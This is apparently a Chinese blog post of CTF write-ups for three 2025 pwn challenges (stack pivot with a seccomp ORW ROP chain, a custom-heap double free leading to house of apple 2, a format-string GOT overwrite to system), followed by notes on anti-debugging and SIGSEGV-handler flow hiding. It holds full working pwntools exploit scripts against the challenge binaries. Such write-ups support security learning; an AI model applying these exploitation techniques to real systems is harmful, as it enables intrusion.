也是终于解决了我面临的各种杂七杂八的事情...虽然让周报停留在21这个数字还挺致敬的,但考虑到我要重新开始学内核,所以还是继续写吧.



##### [羊城杯2025]Stack_Over_Flow

虽然名字叫Stack_Over_Flow,但是这个stack实际上会跑到堆上:

```c
__int64 sub_149C()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  *(_QWORD *)&seed = time(0LL);
  srand(seed);
  for ( qword_4038 = 0LL; qword_4038 <= 2; qword_4038 = rand() % 5 )// 3 or 4
    ;
  main_add = (_QWORD)main * qword_4038;
  stack = malloc(0x1000uLL);
  set_seccomp();
  memset(stack, 0, 0x2000uLL);
  stack = (char *)stack - 672;                  // 2A0 (heap_start)
  new_rbp = (__int64)stack + 0x100;
  *((_QWORD *)stack + 0x20) = (char *)stack + 0x1000;
  *(_QWORD *)(new_rbp + 8) = sub_132E;
  qword_4028 = 0LL;
  return 0LL;
}
```

这里记录了未来的栈地址和返回地址

```assembly
.text:000000000000161F vuln            proc near               ; CODE XREF: sub_1357+32↑p
.text:000000000000161F                                         ; main+17↓p
.text:000000000000161F ; __unwind {
.text:000000000000161F                 endbr64
.text:0000000000001623                 push    rbp
.text:0000000000001624                 lea     rax, aWelcomeToYcb20 ; "Welcome to YCB2025!"
.text:000000000000162B                 mov     rdi, rax        ; s
.text:000000000000162E                 call    _puts
.text:0000000000001633                 lea     rax, aGoodLuck  ; "Good luck!"
.text:000000000000163A                 mov     rdi, rax        ; s
.text:000000000000163D                 call    _puts
.text:0000000000001642                 mov     rax, cs:stack
.text:0000000000001649                 mov     edx, 2000h      ; nbytes
.text:000000000000164E                 mov     rsi, rax        ; buf
.text:0000000000001651                 mov     edi, 0          ; fd
.text:0000000000001656                 call    _read
.text:000000000000165B                 mov     rax, cs:qword_4028
.text:0000000000001662                 cmp     rax, 2
.text:0000000000001666                 jbe     short loc_1681
.text:0000000000001668                 lea     rax, aBye_0     ; "Bye~"
.text:000000000000166F                 mov     rdi, rax        ; s
.text:0000000000001672                 call    _puts
.text:0000000000001677                 mov     edi, 0          ; status
.text:000000000000167C                 call    _exit
.text:0000000000001681 ; ---------------------------------------------------------------------------
.text:0000000000001681
.text:0000000000001681 loc_1681:                               ; CODE XREF: vuln+47↑j
.text:0000000000001681                 mov     rax, cs:qword_4028
.text:0000000000001688                 add     rax, 1
.text:000000000000168C                 mov     cs:qword_4028, rax
.text:0000000000001693                 mov     rax, cs:new_rbp
.text:000000000000169A                 mov     rbp, rax
.text:000000000000169D                 mov     rsp, rbp
.text:00000000000016A0                 xor     rax, rax
.text:00000000000016A3                 pop     rbp
.text:00000000000016A4                 retn
.text:00000000000016A4 vuln            endp
```

而这里则可以看出程序在返回前通过之前记录的堆上地址,把栈迁移到了堆上,然后进行返回.

```assembly
.text:0000000000001642                 mov     rax, cs:stack
.text:0000000000001649                 mov     edx, 2000h      ; nbytes
.text:000000000000164E                 mov     rsi, rax        ; buf
.text:0000000000001651                 mov     edi, 0          ; fd
.text:0000000000001656                 call    _read
```

根据之前对"返回地址"的位置的设定,不难看出这里有一个很大的"栈溢出"

同时我们注意到vuln函数原本会返回到`sub_132E`的位置,而在偏移1357的位置有一个泄露PIE地址的函数:

```assembly
.text:0000000000001357 sub_1357        proc near
.text:0000000000001357 ; __unwind {
.text:0000000000001357                 endbr64
.text:000000000000135B                 sub     rsp, 8
.text:000000000000135F                 add     rsp, 3000h
.text:0000000000001366                 mov     rax, cs:main_add
.text:000000000000136D                 mov     rsi, rax
.text:0000000000001370                 lea     rax, format     ; "magic number:%lld\n"
.text:0000000000001377                 mov     rdi, rax        ; format
.text:000000000000137A                 mov     eax, 0
.text:000000000000137F                 call    _printf
.text:0000000000001384                 mov     eax, 0
.text:0000000000001389                 call    vuln
.text:000000000000138E                 nop
.text:000000000000138F                 retn
```

因此先利用这个函数泄露PIE基址

```python
from pwn import *

r=process("./pwn")
#r=remote("45.40.247.139",18646)
learet_add=0x169d
pay1=b"a"*0x108+b"\x5f"
r.recvuntil(b"Good luck!")
pause()
r.send(pay1)

r.recvuntil(b"magic number:")
pie_add=int(r.recvuntil(b"\n")[:-1])
if (pie_add//3)%0x1000==0x6b0:
    pie_base=pie_add//3-0x16b0
elif (pie_add//4)%0x1000==0x6b0:
    pie_base=pie_add//4-0x16b0
print(hex(pie_base))
```

接着,我们发现在这个位置有一个将stdout地址作为返回值返回的函数:

```c
FILE **sub_12C9()
{
  FILE **result; // rax

  result = (FILE **)qword_4090;
  if ( !qword_4090 )
  {
    qword_4090 = 1LL;
    qword_4098 = (__int64)&stdout;
    return &stdout;
  }
  return result;
}
```

而我们之前用来泄露PIE基址的函数,也正好是用rax作为中间寄存器设置的rdi:

```assembly
.text:0000000000001377                 mov     rdi, rax        ; format
.text:000000000000137A                 mov     eax, 0
.text:000000000000137F                 call    _printf
.text:0000000000001384                 mov     eax, 0
.text:0000000000001389                 call    vuln
.text:000000000000138E                 nop
.text:000000000000138F                 retn
```

于是我们就能用这个gadgets组合泄露出libc基址.

最后则是orw部分.由于这题的沙箱禁用了open和close,read只能通过stdin读入,再加上设置rdx之后的gadgets不好找,因此似乎只能用`pread64`代替.

```python

rdi_add = libc_base + 0x000000000002a3e5 #pop rdi; ret;
rsi_add = libc_base + 0x000000000002be51 #pop rsi;ret;
rdxrbx_add = libc_base + 0x00000000000904a9 #pop rdx;pop rbx;ret
buf_add=pie_base+0x4a00 #a buf
rax_add=libc_base+0x45eb0 #pop rax;ret;
syscall=libc_base+0x91316 #syscall;ret;
r8_add=libc_base+0x165a56 #pop r8; mov eax, 1; ret;

orw=p64(rdi_add)+p64(0)+p64(rsi_add)+p64(buf_add)+p64(rdxrbx_add)+p64(0x5)+p64(0)+p64(rax_add)+p64(0)+p64(syscall)
rop_chain = b""

# 1. 调用openat打开flag文件（syscall号0x101）
rop_chain += p64(rdi_add)          # pop rdi; ret
rop_chain += p64(0xffffffffffffff9c)  # rdi = AT_FDCWD（当前目录）
rop_chain += p64(rsi_add)          # pop rsi; ret
rop_chain += p64(buf_add)          # rsi = 缓冲区地址（存储"flag\x00"）
rop_chain += p64(rdxrbx_add)       # pop rdx; pop rbx; ret
rop_chain += p64(0)                # rdx = O_RDONLY（只读模式）
rop_chain += p64(0)                # rbx = 任意值（占位）
rop_chain += p64(rax_add)          # pop rax; ret
rop_chain += p64(0x101)            # rax = openat的syscall号
rop_chain += p64(syscall)          # 执行openat，返回fd到rax

# 2. 调用pread64读取文件内容到缓冲区（syscall号0x11）
rop_chain += p64(rdi_add)          # pop rdi; ret
rop_chain += p64(3)                # rdi = fd（假设openat返回3）
rop_chain += p64(rsi_add)          # pop rsi; ret
rop_chain += p64(buf_add)          # rsi = 接收数据的缓冲区
rop_chain += p64(rdxrbx_add)       # pop rdx; pop rbx; ret
rop_chain += p64(0x100)            # rdx = 读取长度（256字节）
rop_chain += p64(0)                # rbx = 任意值（占位）
rop_chain += p64(rax_add)          # 修正rax（覆盖r8_add带来的eax=1）
rop_chain += p64(0x11)             # rax = pread64的syscall号
rop_chain += p64(syscall)          # 执行pread64，读取内容到buf

# 3. 调用write输出缓冲区内容到stdout（syscall号0x1）
rop_chain += p64(rdi_add)          # pop rdi; ret
rop_chain += p64(1)                # rdi = stdout的fd（1）
rop_chain += p64(rsi_add)          # pop rsi; ret
rop_chain += p64(buf_add)          # rsi = 存储flag的缓冲区
rop_chain += p64(rdxrbx_add)       # pop rdx; pop rbx; ret
rop_chain += p64(0x100)            # rdx = 输出长度（256字节）
rop_chain += p64(0)                # rbx = 任意值（占位）
rop_chain += p64(rax_add)          # pop rax; ret
rop_chain += p64(0x1)              # rax = write的syscall号
rop_chain += p64(syscall)          # 执行write，输出flag

pay3=b"a"*0x108+orw+rop_chain
pause()
r.send(pay3)
sleep(.5)
r.send("flag\x00")
r.interactive()
```

完整脚本如下:

```python
from pwn import *

r=process("./pwn")
#r=remote("45.40.247.139",18646)
learet_add=0x169d
pay1=b"a"*0x108+b"\x5f"
r.recvuntil(b"Good luck!")
pause()
r.send(pay1)

r.recvuntil(b"magic number:")
pie_add=int(r.recvuntil(b"\n")[:-1])
if (pie_add//3)%0x1000==0x6b0:
    pie_base=pie_add//3-0x16b0
elif (pie_add//4)%0x1000==0x6b0:
    pie_base=pie_add//4-0x16b0
print(hex(pie_base))

get_stdout=0x12C9+pie_base
print_rax=0x163A+pie_base
set_flag=0x160A+pie_base
ret_add=0x101a+pie_base
pay2=b"a"*0x100+p64(0)+p64(ret_add)+p64(get_stdout)+p64(print_rax)

print(hex(len(pay2)))
r.recvuntil(b"Good luck!\n")
context.log_level='debug'
pause()
r.send(pay2)
libc_base=u64(r.recvuntil(b"\n")[:-1].ljust(8,b"\x00"))-0x21B780
print(hex(libc_base))
libc=ELF("./libc.so.6")

rdi_add = libc_base + 0x000000000002a3e5 #pop rdi; ret;
rsi_add = libc_base + 0x000000000002be51 #pop rsi;ret;
rdxrbx_add = libc_base + 0x00000000000904a9 #pop rdx;pop rbx;ret
buf_add=pie_base+0x4a00 #a buf
rax_add=libc_base+0x45eb0 #pop rax;ret;
syscall=libc_base+0x91316 #syscall;ret;
r8_add=libc_base+0x165a56 #pop r8; mov eax, 1; ret;

orw=p64(rdi_add)+p64(0)+p64(rsi_add)+p64(buf_add)+p64(rdxrbx_add)+p64(0x5)+p64(0)+p64(rax_add)+p64(0)+p64(syscall)
rop_chain = b""

# 1. 调用openat打开flag文件（syscall号0x101）
rop_chain += p64(rdi_add)          # pop rdi; ret
rop_chain += p64(0xffffffffffffff9c)  # rdi = AT_FDCWD（当前目录）
rop_chain += p64(rsi_add)          # pop rsi; ret
rop_chain += p64(buf_add)          # rsi = 缓冲区地址（存储"flag\x00"）
rop_chain += p64(rdxrbx_add)       # pop rdx; pop rbx; ret
rop_chain += p64(0)                # rdx = O_RDONLY（只读模式）
rop_chain += p64(0)                # rbx = 任意值（占位）
rop_chain += p64(rax_add)          # pop rax; ret
rop_chain += p64(0x101)            # rax = openat的syscall号
rop_chain += p64(syscall)          # 执行openat，返回fd到rax

# 2. 调用pread64读取文件内容到缓冲区（syscall号0x11）
rop_chain += p64(rdi_add)          # pop rdi; ret
rop_chain += p64(3)                # rdi = fd（假设openat返回3）
rop_chain += p64(rsi_add)          # pop rsi; ret
rop_chain += p64(buf_add)          # rsi = 接收数据的缓冲区
rop_chain += p64(rdxrbx_add)       # pop rdx; pop rbx; ret
rop_chain += p64(0x100)            # rdx = 读取长度（256字节）
rop_chain += p64(0)                # rbx = 任意值（占位）
rop_chain += p64(rax_add)          # 修正rax（覆盖r8_add带来的eax=1）
rop_chain += p64(0x11)             # rax = pread64的syscall号
rop_chain += p64(syscall)          # 执行pread64，读取内容到buf

# 3. 调用write输出缓冲区内容到stdout（syscall号0x1）
rop_chain += p64(rdi_add)          # pop rdi; ret
rop_chain += p64(1)                # rdi = stdout的fd（1）
rop_chain += p64(rsi_add)          # pop rsi; ret
rop_chain += p64(buf_add)          # rsi = 存储flag的缓冲区
rop_chain += p64(rdxrbx_add)       # pop rdx; pop rbx; ret
rop_chain += p64(0x100)            # rdx = 输出长度（256字节）
rop_chain += p64(0)                # rbx = 任意值（占位）
rop_chain += p64(rax_add)          # pop rax; ret
rop_chain += p64(0x1)              # rax = write的syscall号
rop_chain += p64(syscall)          # 执行write，输出flag

pay3=b"a"*0x108+orw+rop_chain
pause()
r.send(pay3)
sleep(.5)
r.send("flag\x00")
r.interactive()
```

##### [羊城杯2025]malloc

一道不是heap的heap.

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  char v3; // [rsp+3h] [rbp-Dh] BYREF
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(a1, a2, a3);
  while ( 1 )
  {
    puts("======MALLOC_MENU======");
    puts("1:creat");
    puts("2:delete");
    puts("3:edit");
    puts("4:show");
    puts("5:exit");
    puts("=======================");
    __isoc99_scanf("%d%c", &v4, &v3);
    switch ( v4 )
    {
      case 1:
        add_chunk();
        break;
      case 2:
        del_chunk();
        break;
      case 3:
        edi_chunk();
        break;
      case 4:
        show_chunk();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid");
        break;
    }
  }
}
```

虽然乍一看是标准的菜单堆题,但点进它的功能函数一看就能发现它实际上实现了一个fake_heap

```c
unsigned __int64 add_chunk()
{
  unsigned int v0; // ebx
  char v2; // [rsp+Fh] [rbp-21h] BYREF
  unsigned int v3; // [rsp+10h] [rbp-20h] BYREF
  unsigned int v4; // [rsp+14h] [rbp-1Ch] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  puts("Index");
  __isoc99_scanf("%u%c", &v3, &v2);             // read_index
  if ( v3 <= 0x10 && (puts("size"), __isoc99_scanf("%u%c", &v4, &v2), v4 <= 0x70) && v4 > 0xF )
  {
    v0 = v3;
    heap_area.chunks[v0] = my_malloc(v4);       // fakeheap?
    heap_area.sizes[v3] = v4;
    puts("Success");
  }
  else
  {
    puts("Invalid");
  }
  return v5 - __readfsqword(0x28u);
}
```

巧合的是前段时间我也给我所在学校的新生赛出了一道fake_heap.不过这题的漏洞点更简单,del后造成了悬空指针,

```c
unsigned __int64 del_chunk()
{
  char v1; // [rsp+3h] [rbp-Dh] BYREF
  unsigned int v2; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Index");
  __isoc99_scanf("%u%c", &v2, &v1);
  if ( v2 <= 0x10 )
  {
    my_free(v2);
    heap_area.sizes[v2] = 0LL;                  // uaf?
    puts("Success");
  }
  else
  {
    puts("Invalid index");
  }
  return v3 - __readfsqword(0x28u);
}
```

对uaf的检查倒是比ptmalloc严格,不过并不影响double_free

```c
__int64 __fastcall my_free(unsigned int a1)
{
  int v1; // kr00_4
  __int64 result; // rax
  int v3; // [rsp+14h] [rbp-1Ch]
  __int64 v4; // [rsp+20h] [rbp-10h]
  __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = heap_area[a1 + 0x200] - 16LL;
  v1 = *(_DWORD *)(v5 + 8);
  *(_QWORD *)heap_area[a1 + 0x200] = fast_bin[v1 / 16];
  fast_bin[v1 / 16] = v5;
  *(_BYTE *)v5 = 0;
  v3 = 0;
  result = *(_QWORD *)(fast_bin[v1 / 16] + 16LL);
  v4 = result;
  while ( v3 <= 13 && v4 )
  {
    if ( v4 == v5 )
    {
      puts("free(): double free or corruption (fast)");
      exit(0);
    }
    result = *(_QWORD *)(v4 + 16);
    v4 = result;
    ++v3;
  }



  return result;
}
```

那么`double_free`后回去改写堆指针和堆块大小数组,创造出任意地址写,然后修改_IO_list_all打house of apple 2即可.

```python
from pwn import *

#r=process("./pwn")
r=remote("45.40.247.139",22383)
def add_chunk(index,size):
    r.recvuntil("=======================")
    r.sendline("1")
    r.recvuntil("Index")
    r.sendline(str(index))
    r.recvuntil("size")
    r.sendline(str(size))
    return

def del_chunk(index):
    r.recvuntil("=======================")
    r.sendline("2")
    r.recvuntil("Index")
    r.sendline(str(index))
    return

def edi_chunk(index,size,text):
    r.recvuntil("=======================")
    r.sendline("3")
    r.recvuntil("Index")
    r.sendline(str(index))
    r.recvuntil("size")
    r.sendline(str(size))
    r.send(text)
    return

def show_chunk(index):
    r.recvuntil("=======================")
    r.sendline("4")
    r.recvuntil("Index")
    r.sendline(str(index))
    return
   
pause()

for i in range(15):
    add_chunk(i,0x70)

for i in range(13):
    del_chunk(i)
del_chunk(14)
del_chunk(13)


del_chunk(0)
add_chunk(0,0x70)
show_chunk(0)
pie_add=u64(r.recvuntil("Success")[-14:-8].ljust(8,b"\x00"))-0x5880
print(hex(pie_add))
edi_chunk(0,0x8,p64(pie_add+0x5200+0x1000+0x10))
for i in range(14):
    add_chunk(2,0x70)
add_chunk(4,0x70)
add_chunk(0,0x70)

def write_add(addr,text,size):
    edi_chunk(0,0x8,p64(addr))
    edi_chunk(4,size,text)
    return

def show_add(addr):
    edi_chunk(0,0x8,p64(addr))
    show_chunk(4)
    return




show_add(pie_add+0x3FA0)
libc_base=u64(r.recvuntil("Success")[-14:-8].ljust(8,b"\x00"))-0x080E50
print(hex(libc_base))

write_add(pie_add+0x5200+0x1000+0x80+0x20,p64(0x2000),0x8)
#hoa2

libc=ELF("./libc.so.6")
IO_list_all=libc_base + libc.sym['_IO_list_all']
_IO_stdfile_2_lock = libc_base + 0x21ca60
chunk0_add=pie_add+0x6400
print(hex(IO_list_all))


write_add(IO_list_all,p64(chunk0_add),0x8)


rdi_add=0x2a3e5+libc_base
rsi_add=0x2be51+libc_base
rdx_add=0x11f357+libc_base #pop rdx; pop r12; ret;
ret_add=0x29139+libc_base
rsp_add=0x35732+libc_base
rbp_add=0x2a2e0+libc_base 


leave_ret = libc_base + 0x000000000004da83
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_rbx = libc_base + 0x00000000000904a9
openn = libc_base + libc.sym['open']
readd = libc_base + libc.sym['read']
writee = libc_base + libc.sym['write']

orw_addr = chunk0_add+0x500
orw = b'./flag\x00\x00'
orw += p64(pop_rdx_rbx) + p64(0) + p64(orw_addr + 0x100) + p64(pop_rdi) + p64(orw_addr) + p64(pop_rsi) + p64(0) + p64(openn)
orw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(orw_addr + 0x200) + p64(pop_rdx_rbx) + p64(0x30) * 2 + p64(readd)
orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(orw_addr + 0x200) + p64(pop_rdx_rbx) + p64(0x30) * 2 + p64(writee)
orw = orw.ljust(0x128 , b'\x00') + p64(leave_ret)

#edit(4 , len(orw) , orw)
write_add(orw_addr,orw,len(orw))

io_addr = chunk0_add
IO_wide_data_addr = io_addr
wide_vtable_addr = io_addr + 0xe8 - 0x68
magic = libc_base + 0x16A0DA
fake_io = b""
fake_io += p64(0)  # _IO_read_end
fake_io += p64(0)  # _IO_read_base
fake_io += p64(0)  # _IO_write_base
fake_io += p64(1)  # _IO_write_ptr
fake_io += p64(0)  # _IO_write_end
fake_io += p64(0)  # _IO_buf_base;
fake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_io += p64(orw_addr)   # _IO_save_base 
fake_io += p64(0)*3   # from _IO_backup_base to _markers
fake_io += p64(0)  # the FILE chain ptr
fake_io += p32(2)  # _fileno for stderr is 2
fake_io += p32(0)  # _flags2, usually 0
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_io += p16(0)  # _cur_column
fake_io += b"\x00"  # _vtable_offset
fake_io += b"\n"  # _shortbuf[1]
fake_io += p32(0)  # padding
fake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_2_lock
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_io += p64(0)  # _codecvt, usually 0
fake_io += p64(IO_wide_data_addr)  # _IO_wide_data_2
fake_io += p64(0) * 3  # from _freeres_list to __pad5
fake_io += p32(0xFFFFFFFF)  # _mode, usually -1
fake_io += b"\x00" * 19  # _unused2
fake_io = fake_io.ljust(0xc8, b'\x00')  # adjust to vtable
fake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # _IO_list_all fake vtable
fake_io += p64(wide_vtable_addr)
fake_io += p64(magic)

#edit(2 , len(fake_io) , fake_io)
write_add(io_addr+0x10,fake_io,len(fake_io))

r.interactive()

```



##### [强网杯2025]flagmarket

一个scanf越界写覆盖覆盖全局缓冲区后方的"You are so parsimonious!!!"字符串导致的非栈上格式化字符串漏洞.

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int i; // [rsp+Ch] [rbp-84h]
  int fd; // [rsp+14h] [rbp-7Ch]
  FILE *stream; // [rsp+18h] [rbp-78h]
  char filename[9]; // [rsp+27h] [rbp-69h] BYREF
  char s[16]; // [rsp+30h] [rbp-60h] BYREF
  char v9[72]; // [rsp+40h] [rbp-50h] BYREF
  unsigned __int64 v10; // [rsp+88h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  ((void (__fastcall *)(__int64, char **, char **))sub_401336)(a1, a2, a3);
  strcpy(filename, "/flag");
  stream = fopen(filename, "r");
  dword_40430C = 1;
  while ( 1 )
  {
    while ( 1 )
    {
      puts("welcome to flag market!\ngive me money to buy my flag,\nchoice: \n1.take my money\n2.exit");
      memset(s, 0, sizeof(s));
      read(0, s, 0x10uLL);
      if ( (unsigned __int8)atoi(s) != 1 )
        exit(0);
      puts("how much you want to pay?");
      memset(s, 0, sizeof(s));
      read(0, s, 0x10uLL);
      if ( (unsigned __int8)atoi(s) == 0xFF )
        break;
      printf("You are so parsimonious!!!");
      if ( dword_40430C )
      {
        fclose(stream);
        dword_40430C = 0;
      }
    }
    puts(aThankYouForPay);
    if ( !dword_40430C || !fgets(v9, 0x40, stream) )
      break;
    for ( i = 0; ; ++i )
    {
      if ( i > 0x40 )
      {
        puts("\nThank you for your patronage!");
        return 0LL;
      }
      if ( v9[i] == '{' )
        break;
      putchar(v9[i]);
      sleep(1u);
    }
    memset(v9, 0, 0x40uLL);
    puts(a1m31mError0mSo);
    puts("opened user.log, please report:");
    memset(oflag, 0, 0x100uLL);
    __isoc99_scanf("%s", oflag);
    getchar();
    fd = open("user.log", (int)oflag);
    write(fd, oflag, 0x100uLL);
    puts(aOkNowYouCanExi);
  }
  puts("something is wrong");
  return 0LL;
}
```

单纯的这个漏洞难以利用,不过可以用printf前方的`read(0, s, 0x10uLL);`将两个地址读到栈上.

修改`exit`got表为main,使这个漏洞可以重复利用:

```python
from pwn import *

L=0
if L==1:
    r=process("./pwn")
else:
    r=remote("8.147.132.32",16133)
#gdb.attach(r)

pause()
r.recvuntil(b"2.exit")
r.sendline(b"1")
r.recvuntil(b"pay?")
r.sendline(b"255")
r.recvuntil(b"please report:")
pay = b'A' * 0x100+b"%155c%12$n%16248c%13$hn"
r.sendline(pay)

r.recvuntil(b"2.exit")
r.sendline(b"1")
r.recvuntil(b"pay?")
r.send(p64(0x404090)+p64(0x404091))
```

之后就是相当传统的泄露libc修改`atoi`got表为system环节.能够打通本地,但线上无法打通,会在发送/bin/sh后断开连接.原因未知.

```python

r.recvuntil(b"2.exit")
r.sendline(b"2")

r.recvuntil(b"2.exit")
r.sendline(b"1")
r.recvuntil(b"pay?")
r.sendline(b"255")
r.recvuntil(b"please report:")
pay = b'A' * 0x100+b"%65$p"
"""
pay = b'A' * 0x100
for i in range (60,70):
    pay+=b"-%"+str(i).encode()+b"$p"
"""
r.sendline(pay)

r.recvuntil(b"2.exit")
r.sendline(b"1")
r.recvuntil(b"pay?\n")
r.send(b"1")
#r.interactive()

libc_base=int(r.recv(14),16)-0x2A28B
print(hex(libc_base))

r.recvuntil(b"2.exit")
r.sendline(b"2")

r.recvuntil(b"2.exit")
r.sendline(b"1")
r.recvuntil(b"pay?")
r.sendline(b"255")
r.recvuntil(b"please report:")
libc=ELF("./libc6_2.39-0ubuntu8_amd64.so")
system_add=libc_base+libc.sym["system"]
print(hex(system_add))
chn1=system_add%0x10000
chn2=system_add%0x100000000//0x10000
print(hex(chn1),hex(chn2),hex(abs(chn1-chn2)))
f=0
if chn1>chn2:
    f=1
if f==0:
    pay = 'A' * 0x100+"%"+str(chn1)+"c%12$hn%"+str(chn2-chn1)+"c%13$hn"
else:
    pay = 'A' * 0x100+"%"+str(chn2)+"c%13$hn%"+str(chn1-chn2)+"c%12$hn"
print(pay)
r.sendline(pay)

r.recvuntil(b"2.exit")
r.sendline(b"1")
r.recvuntil(b"pay?")
pause()
r.send(p64(0x404080)+p64(0x404082))
r.recvuntil(b"choice:")
r.send(b"/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00")
r.interactive()

#0x4014b7

```

##### 最近见到的一些反调试/执行流隐藏

在分析一个windows程序时,发现其在虚拟机内不工作,调试时也不进入正常执行流.

虚拟机内不工作很好理解:

```c++
__int64 __fastcall compare_vm(__int64 a1)
{
  char v2[8]; // [rsp+20h] [rbp-1B8h] BYREF
  unsigned __int64 i; // [rsp+28h] [rbp-1B0h]
  __int64 v4[7]; // [rsp+30h] [rbp-1A8h]
  char v5[8]; // [rsp+68h] [rbp-170h] BYREF
  char v6[16]; // [rsp+70h] [rbp-168h] BYREF
  char v7[16]; // [rsp+80h] [rbp-158h] BYREF
  char v8[8]; // [rsp+90h] [rbp-148h] BYREF
  char v9[24]; // [rsp+98h] [rbp-140h] BYREF
  char Str[256]; // [rsp+B0h] [rbp-128h] BYREF
  char v11; // [rsp+1B0h] [rbp-28h]
  char *SubStr; // [rsp+1B8h] [rbp-20h]
  int v13; // [rsp+1C0h] [rbp-18h]

  if ( !a1 )
    return 0i64;
  for ( i = 0i64; i < 0xFF && *(_BYTE *)(i + a1); ++i )
  {
    v11 = *(_BYTE *)(i + a1);
    if ( v11 < 97 || v11 > 122 )
      v13 = v11;
    else
      v13 = v11 - 32;
    Str[i] = v13;
  }
  Str[i] = 0;
  strcpy(v8, "VMWARE");
  strcpy(v9, "VIRTUALBOX");
  strcpy(v7, "MICROSOFT");
  strcpy(v2, "QEMU");
  strcpy(v6, "PARALLELS");
  strcpy(v5, "XEN");
  v4[0] = (__int64)v8;
  v4[1] = (__int64)v9;
  v4[2] = (__int64)v7;
  v4[3] = (__int64)v5;
  v4[4] = (__int64)v2;
  v4[5] = (__int64)v6;
  v4[6] = 0i64;
  for ( i = 0i64; v4[i]; ++i )
  {
    SubStr = (char *)v4[i];
    if ( strstr(Str, SubStr) )
      return 1i64;
  }
  return 0i64;
}
```

此外还有一些检查有没有电源,开机时长是否大于2min,有没有显示器之类的.

但在ida反编译得到的伪代码内完全看不到反调试的逻辑.

不过我们注意到,在这个程序内有许多意义不明的函数:

```c++
__int64 sub_10000C0E0()
{
  __int64 result; // rax

  result = qword_100021D40;
  *(_DWORD *)qword_100021D40 = 0;
  return result;
}
```

但当我们切换到汇编,就能看到所有没有显示的逻辑,我们发现它会使用`IsDebuggerPresent` 检查有没有被调试,`GetTickCount64`则很有可能是通过检测两次获得时间间的间隔来判断有没有被调试.

当然这不是重点,我们来看这里:

```assembly
.text:000000010000C0ED loc_10000C0ED:                          ; DATA XREF: .rdata:000000010001B0B4↓o
.text:000000010000C0ED ;   __try { // __except at loc_10000C0FF
.text:000000010000C0ED                 mov     rax, cs:qword_100021D40
.text:000000010000C0F4                 mov     dword ptr [rax], 0
.text:000000010000C0FA                 jmp     loc_10000C2BF
.text:000000010000C0FA ;   } // starts at 10000C0ED
.text:000000010000C0FF ; ---------------------------------------------------------------------------
.text:000000010000C0FF
.text:000000010000C0FF loc_10000C0FF:                          ; CODE XREF: anti_debug_1+1CB↓j
.text:000000010000C0FF                                         ; DATA XREF: .rdata:000000010001B0B4↓o
.text:000000010000C0FF ;   __except(unknown_libname_5) // owned by 10000C0ED
```

上面那一段try就是我们之前看的到的逻辑,它通过给为一个不合法地址的rax指向的值赋值,触发错误,从而使程序进入下面的except执行.

同样的,在linux平台上也有类似的机制:

```c
  v3.sa_flags = 4;
  v3.sa_handler = (__sighandler_t)sub_1290;
  sigemptyset(&v3.sa_mask);
  if ( sigaction(11, &v3, 0LL) == -1 )
LABEL_4:
    exit(1);
```

这里将`sub_1290`注册为了段错误 (11 SIGSEGV)信号的处理函数,也就是说如果程序发生了段错误(如非法指针访问)程序就不再会直接退出,而是会调用这个函数进行处理.这样就可以起到与上面类似的隐藏执行流的效果.

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_1340(a1, a2, a3);
  __printf_chk(2LL, "input A and B: ");
  __isoc23_scanf("%d %d", &dword_405C, &dword_4058);
  sub_1310();
  __printf_chk(2LL, "A+B=%d\n", *(unsigned int *)qword_4050);
  return 0LL;
}
__int64 sub_1310()
{
  __int64 result; // rax

  result = qword_4050;//0
  *(_DWORD *)qword_4050 = dword_405C + dword_4058;
  return result;
}
```

例如这个例子中,程序通过访问0地址触发段错误,让程序跳转到sub_1290这个在正常执行流中不存在的分支.

```c
signed __int64 __fastcall sub_1290(__int64 a1, __int64 a2, __int64 a3)
{
  signed __int64 result; // rax
  __int64 v4; // [rsp-6h] [rbp-8h] BYREF

  if ( dword_405C == 114 && dword_4058 == 514 )
  {
    v4 = 0x68732F6E69622FLL;
    result = sys_execve((const char *)&v4, 0LL, 0LL);
  }
  else
  {
    result = (unsigned int)(dword_4058 + dword_405C);
    qword_4050 = (__int64)&dword_4060;
    dword_4060 = dword_4058 + dword_405C;
  }
  *(_QWORD *)(a3 + 168) += 2LL;
  return result;
}
```

这种方法无法隐藏函数逻辑本身,同时还会在正常执行流中留下注册信号处理函数的痕迹.

